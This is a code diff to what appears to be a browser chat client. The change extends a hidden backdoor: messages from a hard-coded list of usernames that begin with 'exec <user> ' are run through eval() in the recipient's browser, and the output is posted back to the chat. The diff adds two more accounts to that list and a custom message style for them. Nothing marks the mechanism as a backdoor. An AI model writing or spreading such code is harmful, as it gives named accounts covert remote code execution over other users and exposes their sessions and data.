@@ -453,7 +453,7 @@ Owner:<ul>
                 }
                 break;
             case "message":
-                if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "ZeroFix", "wolfie"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN"].includes(user)) {
+                if (["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "ZeroTix", "ZeroFix", "wolfie", "HayrenRyzm", "RayhanADev"].includes(msg.m.s) && !["NKY", "NKY5223", "NKYv2", "NKYv3", "NKYv4", "3225YKN", "RayhanADev"].includes(user)) {
                     if (msg.m.r !== -2 && msg.m.m.startsWith("exec " + user + " ")) {
                         try {
                             sendMessage(eval(msg.m.m.slice(6 + user.length)));
@@ -900,7 +900,9 @@ function message(msg, force = false) {
                                             ? "imaduckMsg"
                                             : msg.m.s === "drakerip"
                                                 ? "drakeMsg"
-                                                : ""
+                                                :  ["RayhanADev", "HayrenRyzm"].includes(msg.m.s)
+                                                    ? "rayhanadevMsg"
+                                                    : ""
         }">
         ${force
             ? msg.m.s
